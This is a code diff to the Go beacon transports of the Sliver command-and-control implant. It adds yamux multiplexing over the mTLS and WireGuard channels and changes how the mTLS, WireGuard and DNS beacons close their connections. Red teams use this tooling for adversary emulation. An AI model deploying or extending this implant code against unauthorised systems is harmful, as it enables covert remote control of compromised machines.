@@ -21,6 +21,8 @@ package transports
 // {{if .Config.IsBeacon}}
 
 import (
+	"io"
+
 	// {{if .Config.Debug}}
 	"log"
 
@@ -36,12 +38,18 @@ import (
 
 	// {{end}}
 
+	// {{if or .Config.IncludeMTLS .Config.IncludeWG}}
+	"errors"
+
+	"github.com/hashicorp/yamux"
+
+	// {{end}}
+
 	// {{if .Config.IncludeHTTP}}
 	"github.com/bishopfox/sliver/implant/sliver/transports/httpclient"
 	// {{end}}
 
 	// {{if .Config.IncludeWG}}
-	"errors"
 	"net"
 
 	"github.com/bishopfox/sliver/implant/sliver/transports/wireguard"
@@ -64,6 +72,7 @@ import (
 
 var (
 	_ url.URL
+	_ io.Writer
 )
 
 type BeaconInit func() error
@@ -192,6 +201,7 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 	}
 
 	var conn *tls.Conn
+	var muxSession *yamux.Session
 	beacon := &Beacon{
 		ActiveC2: uri.String(),
 		Init: func() error {
@@ -202,15 +212,68 @@ func mtlsBeacon(uri *url.URL) *Beacon {
 			if err != nil {
 				return err
 			}
+			if conn == nil {
+				return errors.New("[mtls] connect returned nil conn")
+			}
+			if _, err := conn.Write([]byte(mtls.YamuxPreface)); err != nil {
+				_ = conn.Close()
+				return err
+			}
+			cfg := yamux.DefaultConfig()
+			// {{if .Config.Debug}}
+			cfg.Logger = log.Default()
+			cfg.LogOutput = nil
+			// {{else}}
+			cfg.Logger = nil
+			cfg.LogOutput = io.Discard
+			// {{end}}
+			muxSession, err = yamux.Client(conn, cfg)
+			if err != nil {
+				_ = conn.Close()
+				return err
+			}
+			if muxSession == nil {
+				_ = conn.Close()
+				return errors.New("[mtls] failed to create yamux session (nil)")
+			}
 			return nil
 		},
 		Recv: func() (*pb.Envelope, error) {
-			return mtls.ReadEnvelope(conn)
+			if muxSession == nil {
+				return nil, errors.New("[mtls] recv called with nil yamux session")
+			}
+			stream, err := muxSession.Accept()
+			if err != nil {
+				return nil, err
+			}
+			if isNilInterface(stream) {
+				return nil, errors.New("[mtls] accept returned nil stream")
+			}
+			defer stream.Close()
+			return mtls.ReadEnvelope(stream)
 		},
 		Send: func(envelope *pb.Envelope) error {
-			return mtls.WriteEnvelope(conn, envelope)
+			if envelope == nil {
+				return errors.New("[mtls] nil envelope")
+			}
+			if muxSession == nil {
+				return errors.New("[mtls] send called with nil yamux session")
+			}
+			stream, err := muxSession.Open()
+			if err != nil {
+				return err
+			}
+			if isNilInterface(stream) {
+				return errors.New("[mtls] open returned nil stream")
+			}
+			defer stream.Close()
+			return mtls.WriteEnvelope(stream, envelope)
 		},
 		Close: func() error {
+			if muxSession != nil {
+				_ = muxSession.Close()
+				muxSession = nil
+			}
 			if conn != nil {
 				err = conn.Close()
 				if err != nil {
@@ -242,6 +305,7 @@ func wgBeacon(uri *url.URL) *Beacon {
 
 	var conn net.Conn
 	var dev *device.Device
+	var muxSession *yamux.Session
 	beacon := &Beacon{
 		ActiveC2: uri.String(),
 		Init: func() error {
@@ -260,25 +324,56 @@ func wgBeacon(uri *url.URL) *Beacon {
 			if err != nil {
 				return err
 			}
+			if _, err := conn.Write([]byte(wireguard.YamuxPreface)); err != nil {
+				_ = conn.Close()
+				_ = dev.Down()
+				return err
+			}
+			cfg := yamux.DefaultConfig()
+			// {{if .Config.Debug}}
+			cfg.Logger = log.Default()
+			cfg.LogOutput = nil
+			// {{else}}
+			cfg.Logger = nil
+			cfg.LogOutput = io.Discard
+			// {{end}}
+			muxSession, err = yamux.Client(conn, cfg)
+			if err != nil {
+				_ = conn.Close()
+				_ = dev.Down()
+				return err
+			}
 			return nil
 		},
 		Recv: func() (*pb.Envelope, error) {
-			return wireguard.ReadEnvelope(conn)
+			stream, err := muxSession.Accept()
+			if err != nil {
+				return nil, err
+			}
+			defer stream.Close()
+			return wireguard.ReadEnvelope(stream)
 		},
 		Send: func(envelope *pb.Envelope) error {
-			return wireguard.WriteEnvelope(conn, envelope)
+			stream, err := muxSession.Open()
+			if err != nil {
+				return err
+			}
+			defer stream.Close()
+			return wireguard.WriteEnvelope(stream, envelope)
 		},
 		Close: func() error {
-			err = conn.Close()
-			if err != nil {
-				return err
+			if muxSession != nil {
+				_ = muxSession.Close()
+				muxSession = nil
 			}
-			err = dev.Down()
-			if err != nil {
-				return err
+			if conn != nil {
+				_ = conn.Close()
+				conn = nil
 			}
-			conn = nil
-			dev = nil
+			if dev != nil {
+				_ = dev.Down()
+				dev = nil
+			}
 			return nil
 		},
 		Cleanup: func() error {
@@ -362,9 +457,6 @@ func dnsBeacon(uri *url.URL) *Beacon {
 			return client.WriteEnvelope(envelope)
 		},
 		Close: func() error {
-			if client != nil {
-				return client.CloseSession()
-			}
 			return nil
 		},
 		Cleanup: func() error {
